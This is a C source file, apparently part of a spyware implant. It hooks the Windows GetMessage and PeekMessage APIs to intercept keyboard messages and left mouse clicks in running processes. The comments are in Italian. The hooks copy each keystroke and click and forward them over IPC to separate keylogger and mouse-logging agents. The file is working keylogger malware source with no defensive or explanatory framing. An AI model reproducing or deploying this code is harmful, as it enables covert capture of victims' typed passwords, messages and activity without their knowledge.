#include <windows.h>
#include "Common.h"
#include "missing.h"
#include "Hooking.h"
#include "Keylog_Mouse.h"

// -------------------------------- GetMessage -----------------------------------
DEFAULT_SETUP_FUNC(H_GetMessage)
BOOL _stdcall H_GetMessageHook(void *data_param, 
							   LPMSG lpMsg,
							   HWND hwnd,
							   UINT wMsgFilterMin,
							   UINT wMsgFilterMax)									  									  
{
	MSG *rec_msg = NULL;
	KEY_PARAMS key_params;

	INIT_WRAPPER(H_GetMessage, BOOL);
	CALL_ORIGINAL_API(lpMsg, hwnd, wMsgFilterMin, wMsgFilterMax);

	// Se fallisce ritorna...
	if (ret_code==-1 || !ret_code)
		return ret_code;
	
	// Per il keylogger
	IF_ACTIVE_AGENT(PM_KEYLOGAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_KEYDOWN || rec_msg->message == WM_KEYUP ||
			rec_msg->message == WM_SYSKEYDOWN || rec_msg->message == WM_SYSKEYUP ||
			rec_msg->message == WM_CHAR) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				IPC_CLIENT_WRITE(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
			}
	}

	// Per il mouse
	IF_ACTIVE_AGENT(PM_MOUSEAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_LBUTTONDOWN) {
				key_params.msg = rec_msg->message;
				key_params.lprm = rec_msg->lParam;
				key_params.wprm = rec_msg->wParam;
				IPC_CLIENT_WRITE(PM_MOUSEAGENT, (BYTE *)&key_params, sizeof(key_params), (DWORD)rec_msg->hwnd, IPC_DEF_PRIORITY);
			}
	}

	return ret_code;
}


// -------------------------------- PeekMessage -----------------------------------
DEFAULT_SETUP_FUNC(H_PeekMessage)
BOOL _stdcall H_PeekMessageHook(void *data_param, 
							    LPMSG lpMsg,
							    HWND hwnd,
							    UINT wMsgFilterMin,
							    UINT wMsgFilterMax,
							    UINT wRemoveMsg)									  
{
	MSG *rec_msg = NULL;
	KEY_PARAMS key_params;

	INIT_WRAPPER(H_PeekMessage, BOOL);	
	CALL_ORIGINAL_API(lpMsg, hwnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);

	// Se fallisce o il messaggio non viene tolto dalla coda ritorna...
	if (!ret_code || wRemoveMsg!=PM_REMOVE)
		return ret_code;
	
	// Per il keylogger
	IF_ACTIVE_AGENT(PM_KEYLOGAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_KEYDOWN || rec_msg->message == WM_KEYUP ||
			rec_msg->message == WM_SYSKEYDOWN || rec_msg->message == WM_SYSKEYUP ||
			rec_msg->message == WM_CHAR) {

			key_params.msg = rec_msg->message;
			key_params.lprm = rec_msg->lParam;
			key_params.wprm = rec_msg->wParam;
			IPC_CLIENT_WRITE(PM_KEYLOGAGENT, (BYTE *)&key_params, sizeof(key_params), 0, IPC_DEF_PRIORITY);
		}
	}

	// Per il mouse
	IF_ACTIVE_AGENT(PM_MOUSEAGENT) {
		rec_msg = lpMsg;
		if (rec_msg->message == WM_LBUTTONDOWN) {
			key_params.msg = rec_msg->message;
			key_params.lprm = rec_msg->lParam;
			key_params.wprm = rec_msg->wParam;
			IPC_CLIENT_WRITE(PM_MOUSEAGENT, (BYTE *)&key_params, sizeof(key_params), (DWORD)rec_msg->hwnd, IPC_DEF_PRIORITY);
		}
	}

	return ret_code;
}
